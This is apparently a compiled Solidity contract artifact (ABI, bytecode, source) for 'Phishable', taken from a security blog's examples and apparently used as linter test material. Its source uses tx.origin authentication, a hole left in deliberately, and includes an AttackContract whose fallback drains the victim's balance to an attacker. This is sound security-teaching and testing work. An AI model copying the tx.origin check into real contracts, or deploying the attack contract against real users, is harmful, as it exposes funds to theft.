{
  "contractName": "Phishable",
  "abi": [
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "_owner",
          "type": "address"
        }
      ],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "payable": true,
      "stateMutability": "payable",
      "type": "fallback"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "owner",
      "outputs": [
        {
          "internalType": "address",
          "name": "",
          "type": "address"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [
        {
          "internalType": "address payable",
          "name": "_recipient",
          "type": "address"
        }
      ],
      "name": "withdrawAll",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    }
  ],
  "bytecode": "0x608060405234801561001057600080fd5b5060405161027b38038061027b8339818101604052602081101561003357600080fd5b8101908080519060200190929190505050806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550506101e7806100946000396000f3fe6080604052600436106100295760003560e01c80638da5cb5b1461002b578063fa09e63014610082575b005b34801561003757600080fd5b506100406100d3565b604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b34801561008e57600080fd5b506100d1600480360360208110156100a557600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff1690602001909291905050506100f8565b005b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163273ffffffffffffffffffffffffffffffffffffffff161461015157600080fd5b8073ffffffffffffffffffffffffffffffffffffffff166108fc3073ffffffffffffffffffffffffffffffffffffffff16319081150290604051600060405180830381858888f193505050501580156101ae573d6000803e3d6000fd5b505056fea265627a7a72315820cdf35657dd1744a40ceddb890fa997e70aafad49e88e2e22314e9b3202c4c87b64736f6c634300050c0032",
  "source": "// From https://github.com/sigp/solidity-security-blog\n// Tx.Origin Authentication\n\npragma solidity ^0.5.0;\n\ncontract Phishable {\n    address public owner;\n\n    constructor(address _owner) public {\n        owner = _owner;\n    }\n\n    function() external payable {} // collect ether\n\n    function withdrawAll(address payable _recipient) external {\n        // use msg.sender\n        require(tx.origin == owner);\n        _recipient.transfer(address(this).balance);\n    }\n}\n\ncontract AttackContract {\n    Phishable phishableContract;\n    address payable attacker; // The attackers address to receive funds.\n\n    constructor(Phishable _phishableContract, address payable _attackerAddress)\n        public\n    {\n        phishableContract = _phishableContract;\n        attacker = _attackerAddress;\n    }\n\n    function() external payable {\n        phishableContract.withdrawAll(attacker);\n    }\n}\n",
  "sourcePath": "/Users/veronicazheng/src/smart-contracts-testing/contracts/solhint-examples/Phishable.sol",
  "compiler": {
    "name": "solc",
    "version": "0.5.12+commit.7709ece9.Emscripten.clang"
  },
  "schemaVersion": "3.0.19",
  "updatedAt": "2019-11-25T17:21:16.075Z",
  "devdoc": {
    "methods": {}
  },
  "userdoc": {
    "methods": {}
  }
}